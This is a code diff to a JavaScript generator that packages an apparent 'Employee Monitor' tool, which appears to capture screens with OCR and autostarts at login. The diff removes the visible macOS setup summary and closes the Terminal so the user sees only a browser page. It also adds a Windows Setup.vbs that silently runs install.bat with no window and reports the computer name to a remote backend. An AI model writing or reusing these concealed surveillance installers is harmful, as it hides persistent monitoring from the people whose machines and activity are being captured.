-echo "  [*] Testing Python packages..."
-if "$PYTHON_BIN" -c "import pyautogui, pytesseract, psutil, requests" 2>/dev/null; then
-  echo "[OK]   Core packages verified"
-else
-  echo "[WARN] Some packages may be missing — check requirements.txt"
-fi
-
-# ============================================================
-#  COMPLETION SUMMARY
-# ============================================================
-echo ""
-echo "========================================================"
-echo "  SETUP COMPLETE!"
-echo "========================================================"
-echo ""
-echo "Summary:"
-echo "  [OK] Homebrew"
-echo "  [OK] Python 3"
-echo "  [OK] Python packages"
-if [ "$TESSERACT_OK" -eq 1 ]; then
-  echo "  [OK] Tesseract-OCR"
-else
-  echo "  [!!] Tesseract-OCR  <-- manual install needed: brew install tesseract"
-fi
-echo "  [OK] Monitor autostart (LaunchAgent)"
-echo ""
-echo "Next steps:"
-echo "  - Restart your Mac to activate the LaunchAgent autostart"
-echo "  - Monitor starts automatically on every login"
-echo "  - Logs: activity_data/activity_monitor.log"
-echo ""
-read -rp "Restart now to enable autostart? (y/n): " RESTART_NOW
-if [ "\${RESTART_NOW}" = "y" ] || [ "\${RESTART_NOW}" = "Y" ]; then
-  echo "Restarting in 30 seconds... (Ctrl+C to cancel)"
-  sleep 30
-  sudo reboot
-else
-  echo "Please restart your Mac manually when ready."
-  echo "The monitor will begin automatically on next login."
-fi
+# Close this Terminal window so the user sees only the browser
+sleep 1
+osascript -e 'tell application "Terminal" to close first window' 2>/dev/null || true
 `;
 }
 
@@ -1269,6 +849,42 @@ function buildEmployeePackageManifest(platformDefinition, origin) {
   }, null, 2);
 }
 
+function buildWindowsVbsLauncher(origin) {
+  const backendUrl = origin || 'https://eyeing.onrender.com';
+  return `' Employee Monitor — Windows silent launcher
+' Double-click Setup.vbs to install.
+' The setup page opens in your browser; everything else runs silently in the background.
+Option Explicit
+Dim ws, fso, dir, bat, backendUrl, deviceId, installId, setupUrl, urlFile, f
+
+Set ws  = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+dir = fso.GetParentFolderName(WScript.ScriptFullName) & "\\"
+
+backendUrl = "${backendUrl}"
+urlFile = dir & "backend_url.txt"
+If fso.FileExists(urlFile) Then
+  Set f = fso.OpenTextFile(urlFile, 1)
+  Dim u : u = Trim(f.ReadAll())
+  f.Close
+  If u <> "" Then backendUrl = u
+End If
+
+deviceId  = ws.ExpandEnvironmentStrings("%COMPUTERNAME%")
+Randomize
+installId = "win-" & CStr(Int(Rnd * 900000) + 100000)
+setupUrl  = backendUrl & "/setup.html?autoclose=1&device_id=" & deviceId & "&install_id=" & installId
+
+' Open setup page immediately in default browser
+ws.Run "cmd /c start """" """ & setupUrl & """", 0, False
+
+' Run install.bat completely hidden — no window ever appears
+bat = dir & "install.bat"
+ws.Run "cmd /c set ""SKIP_SETUP_OPEN=1"" & call """ & bat & """", 0, False
+`;
+}
+
 function addEmployeePackageFiles(archive, platformDefinition, origin, platformKey) {
   const rootFiles = [
     'monitor.py',
@@ -1324,6 +940,7 @@ function addEmployeePackageFiles(archive, platformDefinition, origin, platformKe
     if (fs.existsSync(installBat)) {
       archive.file(installBat, { name: 'install.bat' });
     }
+    archive.append(buildWindowsVbsLauncher(origin), { name: 'Setup.vbs' });
   }
 
   if (platformDefinition.includeWindowsAutomation) {
